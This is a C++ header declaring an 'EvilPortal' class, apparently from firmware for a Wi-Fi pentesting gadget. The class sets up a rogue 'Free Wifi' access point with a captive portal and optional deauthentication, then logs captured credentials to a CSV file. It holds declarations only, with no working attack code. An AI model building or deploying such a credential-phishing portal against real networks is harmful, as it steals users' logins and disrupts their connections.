#ifndef __EVIL_PORTAL_H__
#define __EVIL_PORTAL_H__

#include <DNSServer.h>
#include <WebServer.h>
#include <globals.h>


class EvilPortal {
public:
    /////////////////////////////////////////////////////////////////////////////////////
    // Constructor
    /////////////////////////////////////////////////////////////////////////////////////
    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false);
    ~EvilPortal();

    /////////////////////////////////////////////////////////////////////////////////////
    // Operations
    /////////////////////////////////////////////////////////////////////////////////////
    bool setup(void);
    void beginAP(void);
    void setupRoutes(void);
    void loop(void);

private:
    String apName = "Free Wifi";
    uint8_t _channel;
    bool _deauth;
    WebServer webServer;

    DNSServer dnsServer;
    IPAddress apGateway;

    String outputFile = "default_creds.csv";
    String htmlPage;
    String htmlFileName;
    bool isDefaultHtml = true;
    FS *fsHtmlFile;

    String lastCred;
    int totalCapturedCredentials = 0;
    int previousTotalCapturedCredentials = -1;
    String capturedCredentialsHtml = "";

    void portalController(void);
    void credsController(void);

    void restartWiFi(void);
    void resetCapturedCredentials(void);
    void printDeauthStatus(bool);
    void printLastCapturedCredential(void);
    void debounceButtonPress(void);

    void loadCustomHtml(void);
    void loadDefaultHtml(void);
    String wifiLoadPage(void);
    void saveToCSV(const String &csvLine);

    void drawScreen(bool holdDeauth);

    String getHtmlTemplate(String body);
    String creds_GET(void);
    String ssid_GET(void);
    String ssid_POST(void);

    void apName_from_keyboard(void);
};

#endif